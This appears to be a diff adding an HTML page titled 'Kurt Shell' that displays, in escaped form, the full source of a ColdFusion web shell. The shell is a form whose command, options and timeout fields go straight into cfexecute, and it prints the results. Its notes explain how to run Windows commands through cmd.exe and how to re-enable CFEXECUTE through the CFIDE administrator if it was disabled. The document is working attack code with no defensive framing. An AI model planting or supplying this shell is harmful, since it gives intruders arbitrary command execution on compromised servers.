@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Kurt Shell</title>
+</head><body>&lt;html&gt;<br/>
+&lt;body&gt;<br/>
+&nbsp;<br/>
+Notes:&lt;br&gt;&lt;br&gt;<br/>
+&lt;ul&gt;<br/>
+&lt;li&gt;Prefix DOS commands with "c:\windows\system32\cmd.exe /c &lt;command&gt;" or wherever cmd.exe is&lt;br&gt;<br/>
+&lt;li&gt;Options are, of course, the command line options you want to run<br/>
+&lt;li&gt;CFEXECUTE could be removed by the admin. If you have access to CFIDE/administrator you can re-enable it<br/>
+&lt;/ul&gt;<br/>
+&lt;p&gt;<br/>
+&lt;cfoutput&gt;<br/>
+&lt;table&gt;<br/>
+&lt;form method="POST" action="cfexec.cfm"&gt;<br/>
+&lt;tr&gt;&lt;td&gt;Command:&lt;/td&gt;&lt;td&gt;&lt;input type=text name="cmd" size=50 <br/>
+&nbsp; &lt;cfif isdefined("form.cmd")&gt;value="#form.cmd#"&lt;/cfif&gt;&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt;<br/>
+&lt;tr&gt;&lt;td&gt;Options:&lt;/td&gt;&lt;td&gt; &lt;input type=text name="opts" size=50 <br/>
+&nbsp; &lt;cfif isdefined("form.opts")&gt;value="#form.opts#"&lt;/cfif&gt;&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt;<br/>
+&lt;tr&gt;&lt;td&gt;Timeout:&lt;/td&gt;&lt;td&gt; &lt;input type=text name="timeout" size=4 <br/>
+&nbsp; &lt;cfif isdefined("form.timeout")&gt;value="#form.timeout#"<br/>
+&nbsp; &lt;cfelse&gt;value="5"&lt;/cfif&gt;&gt;&lt;/td&gt;&lt;/tr&gt;<br/>
+&lt;/table&gt;<br/>
+&lt;input type=submit value="Exec"&gt;<br/>
+&lt;/form&gt;<br/>
+&nbsp;<br/>
+&lt;cfif isdefined("form.cmd")&gt;<br/>
+&nbsp; &lt;cfsavecontent variable="myVar"&gt;<br/>
+&nbsp; &lt;cfexecute name = "#Form.cmd#" arguments = "#Form.opts#" timeout = "#Form.timeout#"&gt; &lt;/cfexecute&gt;<br/>
+&nbsp; &lt;/cfsavecontent&gt;<br/>
+&nbsp; &lt;pre&gt; #myVar# &lt;/pre&gt;<br/>
+&lt;/cfif&gt;<br/>
+&lt;/cfoutput&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;</body></html>
